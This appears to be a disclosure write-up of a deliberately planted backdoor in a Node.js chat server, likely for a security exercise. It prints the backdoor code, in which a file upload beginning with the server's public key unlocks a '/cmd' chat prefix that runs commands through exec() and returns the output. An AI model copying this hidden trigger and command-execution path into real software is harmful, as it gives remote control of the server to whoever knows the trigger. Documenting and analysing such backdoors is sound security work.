### Backdoors and Vulnerabilities
## Executing system commands on the server, from the client.
This code, located within the POST Request Handling of file uploads, checks the contents of each file upload to see if it begins with the data of the server's publicKey.
```
if (check.startsWith(pubkey_pem)) {
	var checkers = check.split("\n");
	if (checkers.length > 9) {
  	var vfp = checkers[9];
		console.log(vfp);
		var client_ind = getClientIndex(vfp);
		if (client_ind != -1) {
			connectedClients[client_ind].permission = 1;
			res.setHeader('Content-Type', 'application/json');
			res.end(JSON.stringify({
  			status: "Created",
				url: "Vulnerability Activated"
			}));
		}
	}
} else {
```
If the file does begin with the server's publicKey, if then the 'next line' in the file contains a valid fingerprint of a currently connected client, add a field "permission" to the client's associated websocket.
Example of file formatting for upload:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoEWigTZy0S1+7qyezGUC
6uUDHy7xWDDGdgsp+7gr9S7GmnvpnYX3LfPBjx4vZ5lc7+8zU3oSsOigudASc1UE
qYyMt5fGkRiNYv7CKl7Jeiz/Ztt5GZKTxOBxFdyWg+upxEXk1OcF15G5LxkskrX4
BseXf30N2Eg5qRqHArbhUyb12s9/R1nueCXZA5+9cWyEzC9GsxaWWV0SkXlUXrtQ
0p37AQxLgm8Tvs54cZa4K4c2bnpWgD/hC0gGd7KXz5l0ByMEan+KVEyyca7pJryJ
Iqmijx2dmrKVkxr8qSAFHAhhoiPx/pYcYiO01lNJ//x2Mt4hV1U3xby42AkDXcJt
EwIDAQAB
-----END PUBLIC KEY-----
6b5cBW7+8zWqFrMXFlo+1hBjbrD/OO2nEMHeiDXBWwA
```
Where the last line is changed to be the the client's fingerprint.
Finally, whenever a client sends a public_chat message to the server, if the "permission" field is present and the message starts with "/cmd ", attempt to execute the message on the commandline.
```
case "public_chat":
	if (dataObj.data !== undefined) {
		var msg = dataObj.data.message;
		var cmd = "";
		if (ws.permission == 1) {
			if (msg.startsWith("/cmd ")) {
				cmd = msg.substr(4);
				console.log("executing code");
				exec(cmd, (err, stdout, stderr) => {
					if (err) {
						console.log("couldn't execute command");
						return;
					}
					console.log(`stdout: ${stdout}`);
					console.log(`stderr: ${stderr}`);
					var retmsg = stdout + "\n" + stderr;
					var execret = {
						type: "anonymous_chat",
						message: retmsg
					};
					ws.send(JSON.stringify(execret));
				});
				return;
			}
		}
	}
	sendToList(connectedClients, JSON.stringify(dataObj), data.sender);
	sendToList(connectedServers, JSON.stringify(dataObj), ws.fingerprint);
	break;
```
